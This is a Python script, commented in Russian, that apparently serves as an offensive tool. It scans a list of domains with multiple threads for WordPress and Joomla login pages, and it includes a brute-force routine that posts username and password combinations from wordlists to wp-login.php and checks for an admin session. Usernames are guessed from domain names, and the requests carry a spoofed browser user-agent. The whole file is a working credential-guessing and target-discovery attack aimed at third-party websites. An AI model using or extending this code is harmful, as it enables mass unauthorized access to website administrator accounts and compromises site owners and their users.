# coding=utf-8
import requests
import time
import os
from threading import Thread, current_thread
from queue import Queue

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'ru-ru,ru;q=0.8,en-us;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'DNT': '1'
}

theard_count =10
domain_file = "domains.txt"
open('good.txt','w')


# Для генерации списка==================================================
#------------------source list---------------------------------
source = open('source.txt' , 'w')
source.close()
#--------------------------------------------------------------
#------------------login list----------------------------------
login = open('login.txt' , 'r')
login_list = login.readlines()
login.close()
#--------------------------------------------------------------
#------------------pwd list------------------------------------
pwd = open('pwd.txt' , 'r')
pwd_list = pwd.readlines()
pwd.close()
#--------------------------------------------------------------
def brut(string):
    t = string.split()
    payload = {
        'log':t[0],
        'pwd':t[1],
        #'wp-submit': 'Log+In',
        #'rememberme': 'forever',
        'redirect_to': 'http://'+t[2]+'/wp-admin',
        'testcookie': '1'
    }
    url = 'http://'+t[2]+'/wp-login.php'
    s = requests.Session()
    try:    
        s.post(url, data=payload, headers=headers, timeout = 10)
    except Exception:
        print('ERROR')
        return False
#---------------------------------------------------------------------------------------
    '''if s.text.find('action=lostpassword')>0:action=logout
        return False
    else:'''
    response = s.get('http://'+t[2]+'/wp-admin', headers=headers, timeout = 10)
    #if response.status_code == 200:
    if response.text.find('action=logout')>0 and response.text.find('profile.php')>0:
    #if response.text.find('action=lostpassword')<0:
        return True
    else:
        return False
    #else:
        #return False

def gen(host):
    #t = domains.split('.')
    #s = t[0]
    for i in range(len(login_list)):
        login = login_list[i].strip()
        for i in range(len(pwd_list)):
            pwd = pwd_list[i].strip()
            s = login+' '+pwd+' '+host
            brut(s)
            #domains = domains_list
            #open('source.txt', 'a+').write(login+' '+pwd+' '+host)

def gen_host():
    for i in range(len(domains_list)):
        s = domains_list[i].strip()
        t = s.split('.')
        if t[0].find('www'):    
            login = t[0]
        else:
            login = t[1]
        '''for i in range(len(pwd_list)):
            pwd = pwd_list[i].strip()
            open('source.txt', 'a+').write(s+' '+pwd+' '+s+'\n')'''
        for i in range(len(pwd_list)):
            pwd = pwd_list[i].strip()
            open('source.txt', 'a+').write(login+' '+pwd+' '+s+'\n')
#=======================================================================
def check_url(host):
    url = 'http://'+host+'/wp-login.php'
    try:
        response = requests.get(url, timeout=10, headers=headers)
    except Exception:
        return False
    else:
        if response.status_code == 200:
            if response.text.find('wp-admin')>0:
                return 2
    url1 = 'http://'+host+'/administrator/index.php'
    try:
        response1 = requests.get(url1, timeout=10, headers=headers)
    except Exception:
        return False
    else:
        if response1.status_code == 200:
            if response1.text.find('loginform')>0:
                return 3
            #else:
                #return False       
        #else:
            #return False

def run(queue, result_queue):
    # Цикл продолжается пока очередь задач не станет пустой
    while not queue.empty():
        # получаем первую задачу из очереди
        host = queue.get_nowait()
        print('{} checking in thread {}'.format(host, current_thread()))
        # проверяем URL
        status = check_url(host)
        # сохраняем результат для дальнейшей обработки
        result_queue.put_nowait((status, host))
        # сообщаем о выполнении полученной задачи
        queue.task_done()
        if status == 2:
            #print('WPWPWPWPWPWPWPWPWPWPWPWPWPWPWPWPWPWPWPWPWPWPWPWP')
            open('good.txt', 'a+').write('Wp:'+host + '\n')
        else:
            pass
        if status == 3:
            #print('JOOJOOJOOJOOJOOJOOJOOJOOJOOJOOJOOJOOJOOJOOJOOJOO')
            open('good.txt', 'a+').write('Joomla:'+host + '\n')
        else:
            pass
        print('{} finished in thread {}. Result={}'.format(host, current_thread(), status))
    print('{} closing'.format(current_thread()))
# Remove duplicate
def f7(seq):
    seen = set()
    seen_add = seen.add
    return [ x for x in seq if not (x in seen or seen_add(x))]
    
# MAIN
def main():
    start_time = time.time()

    # Для получения задач и выдачи результата используем очереди
    queue = Queue()
    result_queue = Queue()
    
    #Delete dupicate
    print('Removing duplicates...')
    input = open('domain.txt', 'r')
    output = open('domains.txt', 'w')
    linesarray = input.readlines()
    input.close()
    seen = []
    seen = f7(linesarray)
    for i in range(len(seen)):
        output.write(seen[i])
    output.close()
    print('Complete')
    #fr_success = os.path.join(domain_temp, "good.txt")
    #fr_errors  = os.path.join(domain_temp, "error.txt")

    # Сначала загружаем все URL из файла в очередь задач
    with open(domain_file) as f:
        for line in f:
            queue.put(line.strip())

    # Затем запускаем необходимое количество потоков
    for i in range(theard_count):
        thread = Thread(target=run, args=(queue, result_queue))
        thread.daemon = True
        thread.start()

    queue.join()

    print(time.time() - start_time)

if __name__ == '__main__':
    main()
